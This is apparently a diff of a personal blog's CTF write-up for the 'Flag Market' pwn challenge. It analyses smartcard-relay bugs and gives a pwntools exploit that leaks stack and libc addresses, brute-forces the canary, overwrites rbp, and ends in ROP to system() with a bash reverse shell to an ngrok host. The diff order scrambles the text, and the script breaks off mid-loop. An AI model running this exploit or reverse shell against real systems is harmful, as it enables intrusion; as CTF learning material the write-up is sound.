-</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;/bin/nc -lnvp 51235&#34;</span>,shell <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(req2)
-</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(req_)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;card_holder=&#34;</span>)
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">LAST STAGE:
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">ROP and reverse shell with bash
-</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
-</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(p<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>))
-</span></span><span style="display:flex;"><span>libc_base <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span>  <span style="color:#ae81ff">0x92059</span>
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC LEAK ADDRESS: &#34;</span> <span style="color:#f92672">+</span> hex(libc_leak))
-</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;LIBC BASE ADDRESS: &#34;</span> <span style="color:#f92672">+</span> hex(libc_base))
-</span></span><span style="display:flex;"><span>system <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x52290</span>
-</span></span><span style="display:flex;"><span>pop_rdi_rbp <span style="color:#f92672">=</span> libc_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x00000000000248f2</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">=</span> overflow
-</span></span><span style="display:flex;"><span>to <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">0x28</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;A&#39;</span>) <span style="color:#f92672">+</span> canary <span style="color:#f92672">+</span> p64(rbp)
-</span></span><span style="display:flex;"><span>to <span style="color:#f92672">+=</span> p64(pop_rdi_rbp) <span style="color:#f92672">+</span> p64(stack_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x70c</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0</span>)
-</span></span><span style="display:flex;"><span>to <span style="color:#f92672">+=</span> p64(system)
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> p16(len(to), endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> to
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">2</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x00</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> p16(<span style="color:#ae81ff">2</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>)
-</span></span><span style="display:flex;"><span>req_ <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90\x00</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, port)
-</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, port)
-</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;/bin/nc -lnvp 51235&#34;</span>,shell <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;BUY_FLAG /buy_flag HTTP/1.1 bash -c &#39;bash -i &gt;&amp; /dev/tcp/</span><span style="color:#e6db74">{</span>r_ip<span style="color:#e6db74">}</span><span style="color:#e6db74">/</span><span style="color:#e6db74">{</span>r_port<span style="color:#e6db74">}</span><span style="color:#e6db74"> 0&gt;&amp;1&#39;&#34;</span>)
-</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.1</span>)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(req_)
-</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>close()
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
-</span></span></code></pre></div>
-    </div>
-    <footer class="content__footer"></footer>
-
-            </section>
-
-            <section class="page__aside">
-                <div class="aside__about">
-<div class="aside__about">
-    <img class="about__logo" src="https://piers-n.github.io/images/cat.png" alt="Logo">
-<h1 class="about__title">piers</h1>
-<p class="about__description">My personal blog on the journey of learning how2pwn</p>
-</div>
-
-
-<ul class="aside__social-links">
-    
-    <li>
-        <a href="https://github.com/piers-n" rel="me" aria-label="GitHub" title="GitHub"><i class="fab fa-github" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-    <li>
-        <a href="sendhelp2703@gmail.com" rel="me" aria-label="Email" title="Email"><i class="fas fa-envelope" aria-hidden="true"></i></a>&nbsp;
-    </li>
-    
-</ul>
-</div>
-                <hr>
-                <div class="aside__content">
-    <p>Writeup on Flag Market Challenge</p>
-    
-        <p>
-            By Piers, 
-            06-09-2022
-        </p>
-    
-
-                </div>
-            </section>
-
-            <footer class="page__footer"><p class="copyright">© 2022</p>
-<p class="advertisement">Powered by <a href="https://gohugo.io/">hugo</a> and <a href="https://github.com/joeroe/risotto">risotto</a>.</p>
-</footer>
-
-        </div>
-    </body>
-
-</html>
+<yg>vicc_getatr</yg> as the name suggests get data into the atrBuf:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#a6e22e>vicc_transmit</span>(ctx, VPCD_CTRL_LEN, <span style=color:#f92672>&amp;</span>i, atr);
+</span></span></code></pre></div><p><yg>vicc_transmit</yg> will send a message and as the same time recv data:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (apdu_len <span style=color:#f92672>&amp;&amp;</span> apdu)
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> <span style=color:#a6e22e>sendToVICC</span>(ctx, apdu_len, apdu);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (r <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>&amp;&amp;</span> rapdu)
+</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> <span style=color:#a6e22e>recvFromVICC</span>(ctx, rapdu);
+</span></span></code></pre></div><p>We are more intersted in <yg>recvFromVICC</yg>, we need to figure out the transfering data protocol:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>    <span style=color:#75715e>/* receive size of message on 2 bytes */</span>
+</span></span><span style=display:flex><span>    r <span style=color:#f92672>=</span> <span style=color:#a6e22e>recvall</span>(ctx<span style=color:#f92672>-&gt;</span>client_sock, <span style=color:#f92672>&amp;</span>size, <span style=color:#66d9ef>sizeof</span> size);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (r <span style=color:#f92672>&lt;</span> <span style=color:#66d9ef>sizeof</span> size)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> r;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    size <span style=color:#f92672>=</span> <span style=color:#a6e22e>ntohs</span>(size);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>0</span> <span style=color:#f92672>!=</span> size) {
+</span></span><span style=display:flex><span>        p <span style=color:#f92672>=</span> <span style=color:#a6e22e>realloc</span>(<span style=color:#f92672>*</span>buffer, size);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (p <span style=color:#f92672>==</span> NULL) {
+</span></span><span style=display:flex><span>            errno <span style=color:#f92672>=</span> ENOMEM;
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#f92672>*</span>buffer <span style=color:#f92672>=</span> p;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e>/* receive message */</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#a6e22e>recvall</span>(ctx<span style=color:#f92672>-&gt;</span>client_sock, <span style=color:#f92672>*</span>buffer, size);  
+</span></span></code></pre></div><p>The transfering scheme is as follow:</p><ol><li>Read the first 2 bytes. This will be the message size.</li><li>Read enough bytes with the size received.</li></ol><p>Now we should recap <yg>SCardStatus</yg> do:</p><ol><li>Call <yg>vicc_connect</yg> and <yg>vicc_getatr</yg> to listen and confirm thats there is a client connecting to.</li><li>Call <yg>vicc_getatr</yg> again to fill the atrBuf<br>The last function we have to look into is <yg>transmit</yg> which is called in <yg>do_transmit</yg> function:</li></ol><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>LONG <span style=color:#a6e22e>transmit</span>(SCARDHANDLE hCard, LPCBYTE sendBuf, DWORD sendLen, LPBYTE transmitBuf, DWORD <span style=color:#f92672>*</span>transmitLen)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    LONG rv;
+</span></span><span style=display:flex><span>    SCARD_IO_REQUEST pioSendPci;
+</span></span><span style=display:flex><span>    DWORD recvLen;
+</span></span><span style=display:flex><span>    BYTE recvBuf[MAX_BUF];
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    recvLen <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(recvBuf);
+</span></span><span style=display:flex><span>    rv <span style=color:#f92672>=</span> <span style=color:#a6e22e>SCardTransmit</span>(hCard, <span style=color:#f92672>&amp;</span>pioSendPci, sendBuf, sendLen, NULL, recvBuf, <span style=color:#f92672>&amp;</span>recvLen);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (rv <span style=color:#f92672>!=</span> SCARD_S_SUCCESS)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> rv;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>memcpy</span>(transmitBuf, recvBuf, recvLen);
+</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>transmitLen <span style=color:#f92672>=</span> recvLen;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> SCARD_S_SUCCESS;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><yg>SCardTransmit</yg> is very similar to <yg>vicc_transmit</yg>. So what <yg>transmit</yg> does is send sendBuf and receive data into recvBuf.<br>But the received data has to pass a check, the last 2 bytes have to be &lsquo;\x90\x00&rsquo;:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>LONG <span style=color:#a6e22e>check_transmit</span>(<span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> buf, DWORD bufLen)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (bufLen <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (buf[bufLen<span style=color:#f92672>-</span><span style=color:#ae81ff>2</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\x90&#39;</span> <span style=color:#f92672>&amp;&amp;</span> buf[bufLen<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>] <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;\x00&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>That&rsquo;s the important part of internal vsmartcard.</p><h3 id=lfyg-exploiting-with-ssrf-in-a-pwn-challenge-lfyg><lf><yg>Exploiting with SSRF in a pwn challenge</lf></yg></h3><p>The internal listening port of vscard for vicc_connect is 35963. Because this port is not exposed to the outside, we have to abuse the overflow bug, overwrite the port and host.<br><red>-> This will make connect_backend to connect to anything we want</red></p><p>Therefore our plan is:</p><ol><li>First connection will send &lsquo;BUY_FLAG /buy_flag HTTP/1.1&rsquo;, to invoke <yg>vicc_connect</yg>, this will serve as the server.</li><li>Second connection will send request that overflows host and port, makes <yg>connect_backend</yg> connect to the first connection&rsquo;s server.</li><li>Now our request data in second connection will se sent to first connection&rsquo;s server.<br>Knowing that there are 2 bugs: the overflow atrBuf and uninitialized transmitBuf, this will enable us to trigger these 2 bugs.</li></ol><h3 id=lfyg-the-full-exploit-plan-lfyg><lf><yg>The full exploit plan</lf></yg></h3><p>First because each process is forked, so every child and parent shares the same address and canary.<br>Therefore we only need to leak once in each process and can be reused later.<br>Our stages of exploit:</p><ol><li><p>The first stage:<br>We want to leak some address through the <red>uninitialized transmitBuf</red>. To do this, in our do_transmit process we will send very little data to fill into <yg>transmitBuf</yg>.<br>This will copy things on stack to credit struct (Sadly there is only stack address)<br>Connection 1 will serve as server. Send &lsquo;BUY_FLAG /buy_flag&rsquo; + manyA to overflow port and host, affect the <yg>connect_backed</yg> so after the <yg>do_transmit</yg>, this credit struct will be send to our remote server to get the leaked address.<br>Connecction 2 overflow port and host to connect to connection 1&rsquo;s server, send very little data to transmitBuf, dont fill it.</p></li><li><p>The second stage:
+Leak the canary. Abuse the <red>overflow atrBuf bug</red>, so we will overwrite into canary value byte by byte. We will slowly guess each byte of canary.<br>If we receive Internal error that means we ran in to __stack_check_fail, thus thats the wrong value.<br>If not, that means we guessed the correct byte of canary.</p></li><li><p>The third stage:
+With the canary and stack address, we will overwrite into saved rbp. This will affect the <yg>route</yg> function.<br>Because the credit struct address is saved at <code>[rbp-0x18]</code>. So we can overwrite rbp to somewhere near our initial <yg>requestBuf</yg>.<br>And make a fake stack layout so that we will achieve arbitrary read, with this we will read libc address on the stack.<br><yg>connect_backend</yg> has to <red>send the data in credit struct to host and port</red>. Port buffer address is at <code>[rbp-0x48]</code>, host buffer address is at <code>[rbp-0x40]</code>.<br>Carefully craft the fake stack layout and we will receive the leak in our remote server.</p></li><li><p>The last stage:<br>ROP then reverse shell.</p></li></ol><h3 id=lfyg-my-messy-exploit-script-lfyg><lf><yg>My messy exploit script</lf></yg></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
+</span></span><span style=display:flex><span> 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#ip = &#34;127.0.0.1&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#75715e>#port = 13337</span>
+</span></span><span style=display:flex><span>ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;flag-market-us.balsnctf.com&#39;</span>
+</span></span><span style=display:flex><span>port <span style=color:#f92672>=</span> <span style=color:#ae81ff>52090</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Our remote server</span>
+</span></span><span style=display:flex><span>r_ip <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;2.tcp.ngrok.io&#39;</span>
+</span></span><span style=display:flex><span>r_port <span style=color:#f92672>=</span> <span style=color:#ae81ff>16971</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>FIRST STAGE: Leak stack address through the uninitialized transmitBuf during do_transmit 
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>which makes the credit structs hold stack address
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Due to fork this makes the stack address remains the same
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>overflow <span style=color:#f92672>=</span> p16(<span style=color:#ae81ff>791</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>) <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;&#39;&#39;GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA35963AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlocalhost HTTP/1.1&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>req <span style=color:#f92672>=</span> overflow
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>atr <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># Satisfy the atr check</span>
+</span></span><span style=display:flex><span>req <span style=color:#f92672>+=</span> p16(len(atr), endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req <span style=color:#f92672>+=</span> atr
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Fill very little into the transmitBuf</span>
+</span></span><span style=display:flex><span>req <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>2</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># To satisfy the check_transmit</span>
+</span></span><span style=display:flex><span>req <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>2</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>req <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x00</span><span style=color:#e6db74>&#34;</span> <span style=color:#75715e># To satisfy the check_transmit</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, port)
+</span></span><span style=display:flex><span>io <span style=color:#f92672>=</span> remote(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;</span><span style=color:#e6db74>{</span>ip<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>, port)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> process(<span style=color:#e6db74>&#34;/bin/nc -lnvp 51235&#34;</span>,shell <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Connection io and connection r are communicating with each other</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Connection r will have port and host overflown with our remote server so we will receive the credit struct</span>
+</span></span><span style=display:flex><span>req1 <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;BUY_FLAG /&#34;</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;buy_flag&#34;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>384</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span>) <span style=color:#f92672>+</span> str(r_port)<span style=color:#f92672>.</span>encode()<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>384</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span>) <span style=color:#f92672>+</span> r_ip<span style=color:#f92672>.</span>encode() 
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>send(req1)
+</span></span><span style=display:flex><span>time<span style=color:#f92672>.</span>sleep(<span style=color:#ae81ff>0.1</span>)
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>sendline(req)
+</span></span><span style=display:flex><span>io<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>recvuntil(<span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;card_number=&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>stack_leak <span style=color:#f92672>=</span> u64(p<span style=color:#f92672>.</span>recv(<span style=color:#ae81ff>6</span>)<span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>8</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\0</span><span style=color:#e6db74>&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>log<span style=color:#f92672>.</span>info(<span style=color:#e6db74>&#34;STACK LEAK ADDRESS: &#34;</span> <span style=color:#f92672>+</span> hex(stack_leak))
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>p<span style=color:#f92672>.</span>close()
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>SECOND STAGE:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>During the receiving of atrBuf, in the card_status the atrLen is uninitialized which means
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>we can overflow the atrBuf
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Abuse this to overwrite into canary byte by byte, if crash and receive Internal error means wrong valule
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>If not that means the byte we guessed was correct
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Due to fork this canary remains the same.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#39;&#39;&#39;</span>
+</span></span><span style=display:flex><span>canary <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\x00</span><span style=color:#e6db74>&#39;</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>7</span>):
+</span></span><span style=display:flex><span>	<span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>256</span>):
+</span></span><span style=display:flex><span>		tmp <span style=color:#f92672>=</span> canary <span style=color:#f92672>+</span> (j)<span style=color:#f92672>.</span>to_bytes(<span style=color:#ae81ff>1</span>,byteorder<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;little&#39;</span>)
+</span></span><span style=display:flex><span>		req_ <span style=color:#f92672>=</span> overflow  
+</span></span><span style=display:flex><span>		to <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x3B\xFC\x18\x00\x00\x81\x31\xFE\x45\x80\x73\xC8\x21\x13\x66\x02\x04\x03\x55\x00\x02\xD2</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>ljust(<span style=color:#ae81ff>0x28</span>,<span style=color:#e6db74>b</span><span style=color:#e6db74>&#39;A&#39;</span>) <span style=color:#f92672>+</span> tmp
+</span></span><span style=display:flex><span>		req_ <span style=color:#f92672>+=</span> p16(len(to), endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>		req_ <span style=color:#f92672>+=</span> to
+</span></span><span style=display:flex><span>		req_ <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>0x40</span><span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>		req_ <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x40</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x00</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>		req_ <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>0x40</span><span style=color:#f92672>+</span><span style=color:#ae81ff>2</span>, endian<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;big&#39;</span>)
+</span></span><span style=display:flex><span>		req_ <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x40</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\x90\x00</span><span style=color:#e6db74>&#34;</span>
